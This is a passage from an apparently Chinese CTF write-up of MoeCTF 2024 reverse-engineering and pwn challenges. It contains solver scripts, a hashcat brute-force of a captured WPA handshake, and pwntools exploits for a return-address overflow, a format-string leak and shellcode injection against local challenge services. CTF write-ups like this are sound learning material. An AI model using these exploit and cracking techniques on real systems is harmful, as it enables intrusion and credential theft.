class="hljs-number">0x7071001344417B54</span>)<br>solver.add(((v7 - v8) ^ (s - v6)) == <span class="hljs-number">0x3FE01013130FFD3</span>)<br>solver.add((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == <span class="hljs-number">0x1989A41A9049C5C9</span>)<br>solver.add((v7 + v6 + s + v8) % <span class="hljs-number">0x1BF52</span> == <span class="hljs-number">21761</span>)<br>solver.add(v8 * v7 * v6 * s % <span class="hljs-number">0x1D4B42</span> == <span class="hljs-number">827118</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    <span class="hljs-built_in">print</span>(model[s].as_long(),end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[s].as_long()),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v6].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v7].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v8].as_long()))<br><br>s=<span class="hljs-string">&#x27;cd5250c9dbc4fdab1760517947e35495&#x27;</span><br>a=<span class="hljs-string">&#x27;&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">8</span>):<br>    a=s[i:i+<span class="hljs-number">8</span>]<br>    a=a[::-<span class="hljs-number">1</span>]<br>    s1+=a<br><span class="hljs-comment">#print(s1)</span><br></code></pre></td></tr></table></figure><h2 id="BlackHole-2"><a href="#BlackHole-2" class="headerlink" title="BlackHole-2"></a>BlackHole-2</h2><p>dll有vmp壳</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724832562212-3d248860-6178-4047-8cfe-10c27dbb9dce.png" class="" title="img"><h2 id="moeprotector"><a href="#moeprotector" class="headerlink" title="moeprotector"></a>moeprotector</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161326570-4e6be3d3-524d-4567-b464-38a877d1fdec.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161138144-4d81b94a-08f2-402b-8459-b715d00b61b9.png" class="" title="img"><p>静态分析到这里，发现比较复杂，需要结合动调</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724162238375-c925b571-bba9-4c15-9c36-201c917c1dcf.png" class="" title="img"><p>输入0能触发第一次异常</p><p>输入长度符合触发第二次异常</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724310928181-2c3ef0d4-bbf6-4b1b-8366-b0b98806b806.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></code></pre></td></tr></table></figure><p>到这里有反调试，需要用ScyllaHide插件反反调试</p><p><a href="https://github.com/x64dbg/ScyllaHide/releases/tag/v1.4">Release v1.4 · x64dbg&#x2F;ScyllaHide (github.com)</a></p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724312564780-41636bf7-54b3-40eb-b12d-83adb5bb5d7a.png" class="" title="img"><p>动态调试发现8个密文一组</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380176738-e0b153c0-d43f-4c63-aa95-49391ee58424.png" class="" title="img"><p>对最后一位进行处理，总共三次循环，基本逻辑差不多</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380241829-f415a6cc-ebba-4b08-b123-43ae15ce2f20.png" class="" title="img"><p>正常分析大概是这样，但是逆不明白</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380762344-07d413bc-89e7-42e2-87b4-6d9a14bf68b6.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380290986-a3acea4f-9120-4f07-aa42-a25c0ed30f01.png" class="" title="img"><p>有个思路是57位明文，8个一组，那么最后一位多余了，但是一般的算法要么直接是8的整数倍，要么填充到8的整数倍，这里没有，猜测是不是所有位处理方式都是一样的，都按最后一位的加密逻辑来，尝试一下发现真的是这样，所以前面的加密可能是在混淆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8D</span>,<br>   <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4C</span>,<br>   <span class="hljs-number">0x33</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x82</span>,<br>   <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x91</span>,<br>   <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>,<br>   <span class="hljs-number">0x44</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8F</span>]<br><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><br><span class="hljs-comment"># ecx=0</span><br><span class="hljs-comment"># esi=0x15151515151515151515151515151515</span><br><span class="hljs-comment"># edx=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+esi)^input1[ecx])+edx</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x4e)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A</span><br><span class="hljs-comment"># dsi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x53)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x19191919191919191919191919191919</span><br><span class="hljs-comment"># esi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x51)+0x14</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x19</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x1a</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x15</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br><span class="hljs-comment">#moectf&#123;w1Nd0Ws_S3H_15_A_g0oD_m37h0d_70_h4nd13_EXCEPTI0NS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="闻风而动-2"><a href="#闻风而动-2" class="headerlink" title="闻风而动-2"></a>闻风而动-2</h2><p>先脱壳</p><p>根据调试发现一次生成一位</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727427480249-4165aa13-80c7-405f-acb4-ea6e14c9a8f6.png" class="" title="img"><p>aaaaaaaa:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p><p>abcdegh:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p><p>得出结论每一位异或的数固定，后续发现没什么用</p><p>将流量包转为22000文件</p><p><code>.\hashcat -m 22000 -a 3 output.22000 ?1?1?1?1?1?1?1?1 -1 hilmnoprsuvwxyz</code>爆破22min得到密码pzyisxnn</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727449908854-6374d9ba-ba25-45f4-bc6f-fe1f69a1cc1e.png" class="" title="img"><p>得到服务器端加密密钥4g3n71u0</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727487798647-80d809db-c31a-473a-9a24-38910e0178a7.png" class="" title="img"><p>findcrypt发现有des</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727492987385-25589b18-be35-4b44-bbbb-09e1e6698595.png" class="" title="img"><p>flag长度为66</p><p>把srv放在win虚拟机上，发现没成功</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727495663055-19e07821-3172-4245-97d6-a8cb6f3a1dcf.png" class="" title="img"><p>后续直接调试srv.exe，输入对应长度的flag和psw后输入ip和addr</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727529028621-a6ba0d7f-e6a0-4857-9346-ca328fc26a00.png" class="" title="img"><p>32位长度高低位交换</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727531030045-42d0368b-fca3-4c7f-99fe-b973f5573f40.png" class="" title="img"><p>调试发现不是标准des，不想做了</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="入门指北-1"><a href="#入门指北-1" class="headerlink" title="入门指北"></a>入门指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723452710680-d24b362c-afec-48e0-bb71-76b8c998e036.png" class="" title="img"><h2 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h2><p>用pwntools进行四则运算，注意发送的时候向下取整，因为结果是负数会wrong，直接str也是wrong</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">34401</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;Let&#x27;s begin with simple ones.\n&quot;</span>)<br>sla(<span class="hljs-string">&quot;1 + 1 = &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;4 / 3 - 1 = &quot;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>ru(<span class="hljs-string">&quot;OK, then some tough ones. Be WELL PREPARED!\n&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i=&quot;</span>,i)<br>data=ru(<span class="hljs-string">&quot; = &quot;</span>)<br>exp = data.decode().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>exp=exp.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#print(&#x27;exp:&#x27;,exp)</span><br>a=<span class="hljs-built_in">eval</span>(exp)<br>a=<span class="hljs-built_in">int</span>(a)<br><span class="hljs-keyword">if</span> a&lt;<span class="hljs-number">0</span>:<br>a=a-<span class="hljs-number">1</span><br>sl(<span class="hljs-built_in">str</span>(a).encode())<br>pr()<br>inter()<br></code></pre></td></tr></table></figure><h2 id="no-more-gets"><a href="#no-more-gets" class="headerlink" title="no_more_gets"></a>no_more_gets</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723442517386-40a34cfe-0f2e-4e3f-85f3-f710611ac63c.png" class="" title="img"><p>溢出修改返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./lockedshell&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">42943</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ret=<span class="hljs-number">0x40129E</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(<span class="hljs-number">0x401176</span>)<br>sla(<span class="hljs-string">&quot;This is my own shell, enter the password or get out.\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="leak-sth"><a href="#leak-sth" class="headerlink" title="leak_sth"></a>leak_sth</h2><p>随机数固定在rsp+8处</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724253292780-bfc577e4-df1f-49df-9225-b6d7233e350a.png" class="" title="img"><p>泄露之后直接发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33265</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>sl(<span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Your name:\n&quot;</span>)<br>a1=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a1=&#x27;</span>,a1)<br>pay=<span class="hljs-built_in">int</span>(a1.decode(),<span class="hljs-number">16</span>)<br><br>sla(<span class="hljs-string">&quot;Give me the number\n&quot;</span>,<span class="hljs-built_in">str</span>(pay))<br>inter()<br></code></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>溢出长度自己决定，开头输入shellcode后修改返回地址</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724291160818-e2df3ce1-093a-4141-900f-a2399b4b8ace.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38059</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> 